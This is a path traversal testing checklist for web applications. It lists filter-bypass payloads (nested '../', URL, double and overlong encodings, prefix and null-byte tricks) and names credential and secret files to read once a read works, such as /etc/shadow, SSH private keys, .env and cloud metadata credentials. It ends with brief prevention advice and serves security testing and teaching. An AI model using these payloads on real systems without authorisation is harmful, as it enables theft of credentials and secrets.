# Path Traversal Testing Checklist

## Recon

1. **Is there a parameter that takes a filename or path?**
   - Check image loading endpoints, file download features, document viewers, template includes
   - Look at the page source for paths like `/image?filename=`, `/download?file=`, `/static?path=`
   - Check Burp history for any request that passes a filename

2. **What happens when you request a normal file?**
   - Does it return the file contents directly?
   - What's the base directory? (e.g. `/var/www/images/`)
   - How many directories deep is it from the filesystem root?

3. **What happens when you try `../../../etc/passwd`?**
   - Works? You have arbitrary file read, go to [Exploit](#exploit)
   - Blocked? What does the response say? Go to [Bypass](#bypass---based-on-what-gets-blocked)

## Bypass - based on what gets blocked

**Does the server strip `../` sequences?**

Try these in order:
- Absolute path: `/etc/passwd` (skip traversal entirely)
- Nested sequences: `....//....//....//etc/passwd` (survives single-pass stripping)
- URL encoding: `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd`
- Double URL encoding: `%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd`
- Non-standard encodings: `..%c0%af`, `..%ef%bc%8f`

**Does the server validate the path starts with a base directory?**

Start with the expected prefix, then traverse out:
- `/var/www/images/../../../etc/passwd`
- The check passes on the prefix, the filesystem resolves the rest

**Does the server require a specific file extension?**

Null byte terminates the filename at the OS level:
- `../../../etc/passwd%00.jpg`
- App sees `.jpg`, OS reads `/etc/passwd`

## Exploit

Once you can read arbitrary files, go for:
- `/etc/passwd` - confirm the vulnerability, enumerate users
- `/etc/shadow` - password hashes (needs root permissions)
- Application source code - find hardcoded credentials, API keys, DB connection strings
- Configuration files - `/etc/apache2/apache2.conf`, `.env`, `web.config`
- SSH keys - `/home/<user>/.ssh/id_rsa`
- Cloud metadata - AWS instance credentials at `http://169.254.169.254/...`

## Prevention

- Whitelist allowed filenames when possible
- Canonicalize the path (resolve all `../`) then verify it starts with the expected base directory
- Don't pass user input to filesystem APIs at all
